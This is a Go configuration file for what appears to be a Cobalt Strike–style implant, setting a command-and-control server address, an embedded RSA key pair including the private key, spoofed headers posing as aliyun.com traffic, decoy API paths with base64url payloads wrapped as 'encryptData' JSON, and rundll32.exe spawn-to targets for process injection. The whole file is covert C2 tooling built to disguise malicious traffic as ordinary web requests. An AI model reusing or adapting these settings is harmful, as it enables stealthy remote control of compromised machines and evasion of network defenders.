package config

import (
	"github.com/imroc/req"
	"time"
)

var (
	RsaPublicKey = []byte(`-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCZUZGE/aibFk7X8HRAjux1pqlw1O6fMjPynI4yj4Bc3Zf44w64ZODO00ZygNE7BnKgeKyz1E4qBvFjo8nNd4hJSyA1/9KYtFGXk75m/w59fzKepCI5ADxfCPfXNrq8zOn1Q6AoC/cc+nyejDstA6KFfr250+bzL8CLlWMzhQrYswIDAQAB
-----END PUBLIC KEY-----`)
	RsaPrivateKey = []byte(`-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAJlRkYT9qJsWTtfwdECO7HWmqXDU7p8yM/KcjjKPgFzdl/jjDrhk4M7TRnKA0TsGcqB4rLPUTioG8WOjyc13iElLIDX/0pi0UZeTvmb/Dn1/Mp6kIjkAPF8I99c2urzM6fVDoCgL9xz6fJ6MOy0DooV+vbnT5vMvwIuVYzOFCtizAgMBAAECgYBrA7Q+z47QMVH3B68dIKWLuTiruPSVycTYos3eHKvMJh/daR7tNfx0YKPbaG6idG2t9I0XOCkWzKHQmpJRCA3nhicfj1n/fhCVTrlCLyLgvVCPqbNrMPZ8mXfe6UPK3E+mi8hJNQxhyDLJqLL45pwXu7jMykV/dhGIh01/Q3gRAQJBAMZQ+2ImjDLXH1WdFbvfBogYVC4Bl0cgfCM7wBxtlajAe6UFiTSnOpN1U7noSBG4XIHZeg4M619WD5XZXDMvN8sCQQDF6fhRmPugdZ2V4544rkGv0fU/7/uwJTZZwYFh63CQoLqQGtD/19wyzM+jJ3UkqC1U6H/eGs3nx+JicsrHS7W5AkEAjX/wrcqFVC0sHWEUxdTPC0IYpi7aapSiHl2eqGoEU8DrOAaoLFp5sAcR817qNUKPNtMehHHxazezrR7G63pwWwJAZjX9LnbpjObxKZXSAsfL2LeABzMzMrclKJmM7jsfeTHo579RrK+YYwvvN/2KvBG2x6EDWHtTV56dReau3to00QJBAMSuwZuFtLcgzItscDgfa9pArMYkWpsj7jIJuOzbLSpjUoOm0wagsdaAowjgrHikOeYeSLTHYOY7P0w6wKQIdAA=
-----END PRIVATE KEY-----`)

	C2                          = "10.211.55.2:8443"
	VerifySSLCert               = true
	TimeOut       time.Duration = 10 //seconds

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
)

var (
	WaitTime = 3000 * time.Millisecond

	HttpHeaders = req.Header{
		"Host":            "aliyun.com",
		"User-Agent":      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)",
		"Content-Type":    "application/json",
		"Accept":          "application/json, text/plain, */*",
		"Mfuser-Agent":    "version=[MForce(1.0.0_230413)/WebPortal (4.0)/encrypt]",
		"Origin":          "aliyun.com",
		"Accept-Language": "zh-CN,zh;q=0.9",
		"Mfclient-Agent":  "WebClient",
	}

	Http_get_uri              = []string{"/api/settings", "/api/workspaces", "/api/kconfig", "/api/customization/favicon", "/api/js", "/api/v1/integrations/ceibal", "/api/v1/datafeed", "/api/v1/help_center", "/api/v1/security/loginSC", "/api/v1/order/create_order", "/api/v1/user/check", "/api/v1/cmd/welcome", "/api/v1/user/ticket"}
	Http_get_metadata_crypt   = []string{"base64url"}
	Http_get_metadata_header  = "Authentication"
	Http_get_metadata_prepend = "Basic "
	Http_get_output_crypt     = []string{"base64url"}
	Http_get_output_prepend   = "{\"encryptData\":\"" //"data="
	Http_get_output_append    = "\"}"                 //"%%"

	Http_post_uri                   = []string{"/api/v2/settings", "/api/v2/workspaces", "/api/v2/kconfig", "/api/v2/customization/favicon", "/api/v2/js", "/api/v2/integrations/ceibal", "/api/v2/datafeed", "/api/v2/help_center", "/api/v2/security/loginSC", "/api/v2/order/create_order", "/api/v2/user/check", "/api/v2/cmd/welcome", "/api/v2/user/ticket"}
	Http_post_id_header             = "userid"
	Http_post_id_crypt              = []string{"base64url"}
	Http_post_client_output_crypt   = []string{"base64url"}
	Http_post_client_output_prepend = "{\"encryptData\":\""
	Http_post_client_output_append  = "\"}"
	Http_post_server_output_crypt   = []string{"base64url"}
	Http_post_server_output_prepend = "{\"encryptData\":\""
	Http_post_server_output_append  = "\"}"

	Spawnto_x86 = "c:\\windows\\syswow64\\rundll32.exe"
	Spawnto_x64 = "c:\\windows\\system32\\rundll32.exe"

	//代理开关
	ProxyOn = false
	Proxy   = "http://127.0.0.1:8080"

	//Sleep_mask = true

)

const (
	DebugMode = true
)
